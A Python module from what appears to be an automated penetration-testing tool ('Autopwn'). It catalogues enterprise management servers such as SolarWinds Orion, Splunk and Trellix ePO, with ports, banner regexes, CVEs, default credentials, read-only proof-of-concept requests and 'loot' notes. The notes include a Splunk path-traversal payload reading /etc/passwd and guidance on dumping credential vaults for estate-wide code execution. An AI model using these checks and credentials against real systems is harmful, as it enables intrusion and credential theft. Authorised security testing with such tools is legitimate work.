# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Product signatures for enterprise management / monitoring servers.

Autopwn is strong at the AD kill chain but treated every appliance as a generic
web host. This catalogue teaches it to *recognise* the management servers that
dominate real estates — Trellix ePO, SolarWinds NPM/Orion, Splunk, Acronis Cyber
Protect, Tripwire, ExtremeCloud IQ Site Engine, WSUS, NPS — from their ports and
banners, and to know, per product:

  * how to confirm it (ports + banner/title/header regexes),
  * its notable CVEs and the default credentials worth a *non-destructive* login
    test,
  * a **safe, read-only** proof-of-access check (a GET that confirms exposure /
    an auth bypass without changing state), and
  * what it stores that unlocks the rest of the estate (the credential-vault
    loot).

Consumed by ``tools/mgmt.py`` (product_recon + default_creds) and by the
``mgmt-server-audit`` playbook. Detection is data-only — adding a product is a
new ``Product`` entry, no code.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional


@dataclass(frozen=True)
class Product:
    id: str                       # short slug; sets host fact  is_<id>=true
    name: str                     # human name for findings
    ports: tuple                  # TCP ports the product listens on
    patterns: tuple = ()          # regexes (case-insensitive) that CONFIRM it in
                                  #   a banner / HTTP title / Server header
    strong_ports: tuple = ()      # ports unique enough to identify on port alone
    anti_ports: tuple = ()        # if ANY is open, this product does NOT match
                                  #   (disambiguates overlapping signatures)
    scheme: str = "https"         # URL scheme for the web console
    web_port: int = 0             # primary web port (0 → first of `ports`)
    nuclei: bool = True           # run nuclei CVE templates against the console
    default_creds: tuple = ()     # (user, password) pairs worth a login test
    login: Optional[dict] = None  # safe login test — see _login_test()
    safe_poc: Optional[dict] = None  # read-only PoC — {path, ok, cve, desc}
    cves: tuple = ()              # ("CVE-… — desc", …) surfaced in the finding
    loot: str = ""                # what to pull post-access (the payoff)
    severity: str = "High"
    cvss: str = "7.5"
    attack: tuple = ()            # MITRE ATT&CK technique ids
    note: str = ""

    @property
    def url_port(self) -> int:
        return self.web_port or (self.ports[0] if self.ports else 443)


# --------------------------------------------------------------------------- #
# Cluster A — management / monitoring servers
# --------------------------------------------------------------------------- #
PRODUCTS: list[Product] = [
    Product(
        id="solarwinds_orion",
        name="SolarWinds Orion / NPM",
        ports=(443, 17777, 17778, 17790, 17791),
        strong_ports=(17778, 17790, 17791),   # SWIS / Information Service — unique
        patterns=(r"solarwinds", r"\borion\b", r"SolarWinds\.Orion"),
        web_port=443,
        default_creds=(("admin", ""), ("admin", "admin")),  # Orion admin historically blank
        login={"type": "form", "path": "/Orion/Login.aspx",
               "user_field": "ctl00$BodyContent$Username",
               "pass_field": "ctl00$BodyContent$Password",
               "fail": r"(?i)invalid|incorrect|error"},
        safe_poc={"path": "/SolarWinds/InformationService/v3/Json/Query?query=SELECT+1",
                  "ok": r"(?i)results|totalrows|\"1\"",
                  "cve": "CVE-2020-10148",
                  "desc": "SolarWinds Information Service (SWIS) reachable — "
                          "SUPERNOVA-style auth-bypass surface."},
        cves=("CVE-2020-10148 — Orion API auth bypass (SUPERNOVA path)",
              "CVE-2021-35211 — Serv-U remote code execution",
              "CVE-2024-28986 — Web Help Desk deserialization RCE"),
        loot="Orion credential vault stores the SNMP/SSH/WMI creds for every "
             "monitored switch, router, firewall and server — dump it and you own "
             "the network estate. SWIS API + Orion DB (SQL) hold them.",
        severity="Critical", cvss="9.8",
        attack=("T1190", "T1078", "T1552.001", "T1552.004"),
    ),
    Product(
        id="trellix_epo",
        name="Trellix / McAfee ePolicy Orchestrator (ePO)",
        ports=(8443, 8444, 8081, 8082),
        strong_ports=(),
        patterns=(r"epolicy\s*orchestrator", r"\bePO\b", r"mcafee", r"trellix",
                  r"orion\.war"),
        web_port=8443,
        default_creds=(("admin", "admin"), ("admin", "password")),
        login=None,   # ePO console is CSRF-protected — rely on nuclei + finding
        safe_poc={"path": "/core/config", "ok": r"(?i)ePO|orchestrator",
                  "cve": "", "desc": "ePO console reachable."},
        cves=("CVE-2016-8016..8023 — multiple ePO XSS/SQLi/info-leak",
              "CVE-2015-0921 — ePO XXE",
              "CVE-2020-7317 — ePO stored XSS"),
        loot="ePO deploys agents to every managed endpoint — an ePO admin can "
             "push a task/deployment = mass SYSTEM RCE across the estate. The ePO "
             "SQL DB holds the console + agent-handler credentials.",
        severity="Critical", cvss="9.1",
        attack=("T1190", "T1078", "T1072"),
    ),
    Product(
        id="splunk",
        name="Splunk Enterprise",
        ports=(8000, 8089, 9997),
        strong_ports=(8089, 9997),
        patterns=(r"splunkd?", r"Splunk\s|>Splunk<"),
        web_port=8089,   # management REST — reliable, safe basic-auth login test
        default_creds=(("admin", "changeme"), ("admin", "changed"),
                       ("admin", "admin")),
        login={"type": "basic", "path": "/services/authentication/current-context?output_mode=json",
               "ok": r"(?i)username|\"admin\"", "fail": r"(?i)401|unauthorized"},
        safe_poc={"path": "/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd",
                  "ok": r"root:.*:0:0:",
                  "cve": "CVE-2024-36991",
                  "desc": "Splunk Web arbitrary file read (path traversal) — "
                          "read-only proof."},
        cves=("CVE-2024-36991 — Splunk Web path traversal (arbitrary file read)",
              "CVE-2023-46214 — RCE via insecure XSLT upload",
              "CVE-2023-40598 — RCE via legacy 'runshellscript'"),
        loot="Splunk stores creds in passwords.conf (RC4/splunk.secret decryptable). "
             "A Splunk/deployment-server admin can push an app with a scripted input "
             "= SYSTEM RCE on every forwarder reporting to it. A lone Universal "
             "Forwarder's 8089 (default admin:changeme) likewise accepts a "
             "scripted-input app = code execution (often SYSTEM) on that host.",
        severity="High", cvss="8.6",
        attack=("T1190", "T1078", "T1552.001", "T1072"),
    ),
    Product(
        id="acronis_cyber_protect",
        name="Acronis Cyber Protect management server",
        ports=(9877, 9876, 7780, 443, 8443),
        strong_ports=(9877, 9876, 7780),
        patterns=(r"acronis", r"cyber\s*protect", r"AcronisAgent"),
        web_port=9877,
        default_creds=(("root", "root"), ("admin", "admin")),
        login=None,
        safe_poc={"path": "/api/1/idp/.well-known/openid-configuration",
                  "ok": r"(?i)acronis|issuer|authorization_endpoint",
                  "cve": "", "desc": "Acronis management API reachable."},
        cves=("CVE-2023-45249 — default password → remote code execution",
              "CVE-2022-30995 — Cyber Protect insufficient auth",
              "CVE-2022-3405 — path traversal"),
        loot="The backup server can read/restore every protected host's data and "
             "push agent operations — full data access plus a code-exec path to "
             "every managed endpoint.",
        severity="Critical", cvss="9.8",
        attack=("T1190", "T1078", "T1003", "T1490"),
    ),
    Product(
        id="tripwire_enterprise",
        name="Tripwire Enterprise / IP360 / CCM",
        ports=(8080, 8443, 443),
        strong_ports=(),
        patterns=(r"tripwire", r"TE\s*Console", r"IP360", r"nCircle"),
        web_port=8443,
        default_creds=(("administrator", "tripwire"), ("admin", "admin")),
        login=None,
        cves=("CVE-2017-15250 — Tripwire IP360 CSRF",
              "Tripwire Enterprise — weak/ default console credentials"),
        loot="Tripwire holds privileged agent + device credentials used to log in "
             "and assess every monitored host and network device; its console "
             "account can alter/silence integrity monitoring.",
        severity="High", cvss="8.1",
        attack=("T1190", "T1078", "T1552.001", "T1562.001"),
    ),
    Product(
        id="extreme_xiq_site",
        name="ExtremeCloud IQ Site Engine (NetSight)",
        ports=(8443, 8080, 443),
        strong_ports=(),
        patterns=(r"extremecloud", r"netsight", r"site\s*engine", r"extreme\s*networks"),
        web_port=8443,
        default_creds=(("root", "abc123"), ("admin", "Extreme@pp"),
                       ("admin", "netsight")),
        login=None,
        cves=("CVE-2023-40376 — XIQ-SE stored XSS",
              "ExtremeCloud IQ Site Engine — default appliance credentials"),
        loot="Site Engine stores the SNMP/CLI credentials for every managed "
             "Extreme switch/AP and can push configuration — a foothold into the "
             "whole switching fabric.",
        severity="High", cvss="8.1",
        attack=("T1190", "T1078", "T1552.001"),
    ),
    Product(
        id="wsus",
        name="Windows Server Update Services (WSUS)",
        ports=(8530, 8531),
        strong_ports=(8530, 8531),
        patterns=(r"wsus", r"SimpleAuthWebService", r"ClientWebService"),
        web_port=8530, scheme="http", nuclei=False,
        default_creds=(),
        login=None,
        safe_poc={"path": "/ClientWebService/client.asmx",
                  "ok": r"(?i)wsus|SimpleAuth|WebService",
                  "cve": "", "desc": "WSUS update endpoint reachable."},
        cves=("WSUS-over-HTTP + no update signing → on-path malicious update push "
              "(WSUSpect / SharpWSUS)",),
        loot="If clients use WSUS over cleartext HTTP (8530) an on-path attacker "
             "injects a malicious 'update' = SYSTEM code execution on every WSUS "
             "client. A WSUS admin can approve a lateral-movement package directly.",
        severity="High", cvss="8.1",
        attack=("T1557.001", "T1072"),
    ),
    Product(
        id="nps_radius",
        name="Microsoft NPS / RADIUS",
        ports=(1812, 1813, 1645, 1646),
        strong_ports=(1812, 1813),
        patterns=(r"radius", r"\bNPS\b"),
        web_port=0, scheme="", nuclei=False,
        default_creds=(),
        login=None,
        cves=("RADIUS/MSCHAPv2 — captured PEAP/EAP exchanges are offline-crackable; "
              "RADIUS shared-secret reuse enables auth manipulation (Blast-RADIUS "
              "CVE-2024-3596 for PAP/CHAP over UDP)",),
        loot="NPS brokers 802.1X/VPN auth against AD. A weak RADIUS shared secret "
             "or captured MSCHAPv2 handshake yields domain credentials / network "
             "access. CVE-2024-3596 (Blast-RADIUS) forges Access-Accept.",
        severity="Medium", cvss="6.5",
        attack=("T1557", "T1110.002", "T1078"),
    ),
]

_BY_ID = {p.id: p for p in PRODUCTS}


def get(pid: str) -> Optional[Product]:
    return _BY_ID.get(pid)


def all_ports() -> list[int]:
    """Every management port across the catalogue — for a targeted recon sweep."""
    return sorted({p for prod in PRODUCTS for p in prod.ports})


def _host_open_ports(entry: dict) -> set:
    ports = set()
    for p in (entry.get("ports") or {}).values():
        if p.get("state") in (None, "open") and p.get("port"):
            ports.add(int(p["port"]))
    return ports


def _host_banner_text(entry: dict) -> str:
    """All fingerprintable text nmap captured for a host: service/product/version
    plus any http-title, concatenated for pattern matching."""
    bits = []
    for p in (entry.get("ports") or {}).values():
        for k in ("service", "product", "version", "extrainfo", "title", "banner"):
            v = p.get(k)
            if v:
                bits.append(str(v))
    for k in ("os", "http_title", "hostname"):
        v = entry.get(k)
        if v:
            bits.append(str(v))
    return " ".join(bits)


def identify(entry: dict, evidence: str = "") -> list[dict]:
    """Products present on a host. Returns [{product, ports, reason}].

    A product matches when it shares an open port with the host AND either that
    port is *unique* to the product (strong_ports) or one of its banner/title
    patterns appears in the host's fingerprint text or the supplied `evidence`
    (e.g. HTTP titles/headers captured by http_probe / whatweb / nuclei)."""
    open_ports = _host_open_ports(entry)
    text = (_host_banner_text(entry) + " " + (evidence or "")).lower()
    out = []
    for prod in PRODUCTS:
        hit_ports = sorted(open_ports & set(prod.ports))
        if not hit_ports:
            continue
        if open_ports & set(prod.anti_ports):
            continue   # a distinguishing port of another product is open
        strong = sorted(open_ports & set(prod.strong_ports))
        matched = [pat for pat in prod.patterns
                   if re.search(pat, text, re.I)]
        if strong:
            reason = f"port {strong[0]} is unique to {prod.name}"
        elif matched:
            reason = f"banner/title matched /{matched[0]}/ on port {hit_ports[0]}"
        else:
            continue   # shared port with no confirming banner → not enough
        out.append({"product": prod, "ports": hit_ports, "reason": reason})
    return out
